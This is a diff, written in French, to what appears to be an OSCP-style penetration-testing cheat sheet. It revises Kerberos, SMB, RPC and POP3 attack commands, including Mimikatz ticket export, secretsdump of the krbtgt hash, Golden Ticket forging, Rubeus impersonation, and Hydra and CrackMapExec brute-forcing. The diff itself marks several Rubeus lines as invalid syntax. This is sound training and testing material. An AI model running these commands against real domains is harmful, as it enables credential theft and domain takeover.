@@ -1162,10 +1162,10 @@ krb5-brute -d <domain> -t <target_ip> -u <username> -p <password_list>
 <p class="oscp-command-note">Impacket : ouvrir une session ou exécuter une commande distante selon les droits disponibles.</p>
 
 ```bash
-# Renouveler un ticket Kerberos TGT
-python3 psexec.py <domain>/<username>:<password>@<target_ip> -impersonate-user <target_user>
+# Obtenir un TGT avec un compte autorisé (ceci n'est pas un renouvellement)
+impacket-getTGT -dc-ip 192.0.2.10 exemple.local/utilisateur
 
-# Exécuter des techniques Kerberos avec Rubeus
+# Exemples Rubeus à vérifier selon la version : ne pas confondre mot de passe, hash RC4 et délégation
 rubeus.exe asktgt /user:<username> /rc4:<password>
 rubeus.exe tgtdeleg /user:<username> /rc4:<password>
 rubeus.exe s4u /user:<username> /rc4:<password> /impersonateuser:<target_user>
@@ -1175,23 +1175,23 @@ rubeus.exe s4u /user:<username> /rc4:<password> /impersonateuser:<target_user>
 <p class="oscp-command-note">Analyser les informations d’authentification avec Mimikatz.</p>
 
 ```powershell
-# Extraire les tickets Kerberos de la mémoire avec Mimikatz
-mimikatz "lsadump::dcom" "sekurlsa::tickets /export"
+# Exporter les tickets accessibles avec les droits nécessaires (commande sensible)
+mimikatz "sekurlsa::tickets /export"
 
 ```
 
 <p class="oscp-command-note">Kerberos : tester les noms de comptes du domaine avec Kerbrute.</p>
 
 ```bash
-# Essai de configurations de pré-authentification faibles
-python3 kerbrute.py -d <domain> -u <user_list> -p <password_list> -dc <dc_ip>
+# Énumérer les utilisateurs Kerberos autorisés avec le binaire Kerbrute
+kerbrute userenum --dc 192.0.2.10 -d exemple.local utilisateurs.txt
 
 ```
 
 <p class="oscp-command-note">Examiner les tickets et paramètres Kerberos.</p>
 
 ```bash
-# Créer un ticket argent avec Rubeus
+# Attention : la commande ci-dessous n'est pas une syntaxe valide de création de Silver Ticket ; se référer à la version de Rubeus utilisée
 rubeus.exe tgt::add /user:<username> /rc4:<password> /sid:<domain_sid> /domain:<domain>
 
 ```
@@ -1199,10 +1199,10 @@ rubeus.exe tgt::add /user:<username> /rc4:<password> /sid:<domain_sid> /domain:<
 <p class="oscp-command-note">Demander un ticket Kerberos TGT.</p>
 
 ```bash
-# 1. Obtain a Valid TGT (Ticket Granting Ticket)
+# 1. Obtenir un ticket TGT valide avec un compte autorisé
 impacket-GetTGT -dc-ip <dc_ip> -outputfile <tgt_file> <user>@<domain>
 
-# 2. Forge a Silver Ticket
+# 2. La commande atexec ci-dessous ne forge pas un Silver Ticket ; exemple historique à ne pas reproduire tel quel
 impacket-atexec -target-ip <target_ip> -service <service> -ticket <ticket_file> <username>
 
 ```
@@ -1210,7 +1210,7 @@ impacket-atexec -target-ip <target_ip> -service <service> -ticket <ticket_file> 
 <p class="oscp-command-note">Examiner les tickets et paramètres Kerberos.</p>
 
 ```bash
-# Créer un billet doré avec Rubeus
+# Attention : l'exemple ci-dessous mélange des paramètres et ne constitue pas une commande Rubeus valide de Golden Ticket
 rubeus.exe tgt::add /user:<username> /rc4:<password> /domain:<domain> /sid:<domain_sid> /rc4:<krbtgt_hash>
 
 ```
@@ -1221,7 +1221,7 @@ rubeus.exe tgt::add /user:<username> /rc4:<password> /domain:<domain> /sid:<doma
 # 1. Obtenir le hash NTLM du compte krbtgt
 impacket-secretsdump -outputfile <dump_file> <target_domain>/<username>:<password>@<dc_ip>
 
-# 2. Generate a Golden Ticket
+# 2. Exemple historique de génération d'un Golden Ticket : syntaxe à vérifier selon l'outil installé
 ticketer -user <user> -domain <domain> -sid <domain_sid> -krbtgt <krbtgt_hash> -output <ticket_file>
 
 # 3. Utiliser le ticket Kerberos forgé dans le laboratoire.
@@ -1262,10 +1262,10 @@ RETR 1
 <p class="oscp-command-note">Hydra : tester des identifiants autorisés sur POP3 à partir d'un dictionnaire.</p>
 
 ```bash
-# Tester les mots de passe du service POP3
+# Tester des identifiants POP3 dans un laboratoire autorisé
 hydra -l <username> -P <password_list> -f <target_ip> pop3 -V
 
-# Force brute avec SSL/TLS sur POP3 au-dessus du port 995
+# Tester POP3S sur le port 995 (TLS implicite) dans le périmètre autorisé
 hydra -S -v -l <username> -P <password_list> -s 995 -f <target_ip> pop3 -V
 
 ```
@@ -1333,7 +1333,7 @@ impacket-rpcdump <IP_CIBLE> -port 135
 ```
 
 ```bash
-# Scanner les services RPC sur les services HTTP en utilisant Nmap
+# Identifier le service RPC sur HTTP (TCP 593)
 nmap -sV -p 593 <IP_CIBLE>
 
 ```
@@ -1356,8 +1356,8 @@ rpcclient -U '' -N <IP_CIBLE> -c 'enumdomusers'
 # Énumérer les groupes de domaines
 rpcclient -U '' -N <IP_CIBLE> -c 'enumdomgroups'
 
-# Demande d'informations à l'utilisateur
-rpcclient -U '<UTILISATEUR>' -W '<DOMAINE>' <IP_CIBLE> -c 'enumdomusers'
+# Énumérer les utilisateurs avec un compte de domaine autorisé
+rpcclient -U 'utilisateur' -W 'EXEMPLE' 192.0.2.10 -c 'enumdomusers'
 
 ```
 
@@ -1384,7 +1384,7 @@ dsenumdomtrusts
 ```
 
 ```bash
-# Liste des utilisateurs
+# Lister les utilisateurs du domaine depuis une session rpcclient
 enumdomusers
 
 # Obtenir les détails de l'utilisateur
@@ -1393,10 +1393,10 @@ queryuser <0xrid>
 # Obtenir des groupes d'utilisateurs
 queryusergroups <0xrid>
 
-# Obtenir l'utilisateur SID
+# Résoudre un nom de compte en SID
 lookupnames <username>
 
-# Obtenez des Aliases Utilisateurs
+# Obtenir les alias associés à un utilisateur (selon les commandes prises en charge)
 queryuseraliases [builtin|domain] <sid>
 
 ```
@@ -1419,7 +1419,7 @@ querygroupmem <0xrid>
 # Liste des alias
 enumalsgroups <builtin|domain>
 
-# Obtenez des membres d'Alias
+# Lister les membres d'un alias
 queryaliasmem builtin|domain <0xrid>
 
 ```
@@ -1428,7 +1428,7 @@ queryaliasmem builtin|domain <0xrid>
 # Liste des domaines
 enumdomains
 
-# Obtenir le SID du domaine
+# Interroger le SID et les informations de politique du domaine
 lsaquery
 
 # Obtenir des informations de domaine
@@ -1439,16 +1439,16 @@ querydominfo
 <p class="oscp-command-note">Nmap (SMB) : lancer les scripts NSE « smb-brute ».</p>
 
 ```bash
-# Nmap
-nmap --script smb-brute.nse -p 445 <IP>
+# Nmap : vérifier la présence du service SMB
+nmap -sV -p 445 192.0.2.10
 
 # CrackMapExec
 crackmapexec smb <IP> -u 'admin' -p wordlist_pass.txt
 # Autre possibilité
 crackmapexec smb <IP> -u 'wordlist_user.txt' -p password
 
-# Lookup SID avec Brute Force (exige que nous ayons des identifiants valides et le nom de domaine)
-impacket-lookupsid [domain.com]/[userName]:[domain.com]@987@[ip]
+# Énumérer les SID/RID via Impacket avec un compte de laboratoire autorisé
+impacket-lookupsid 'exemple.local/utilisateur@192.0.2.10'
 
 ```
 
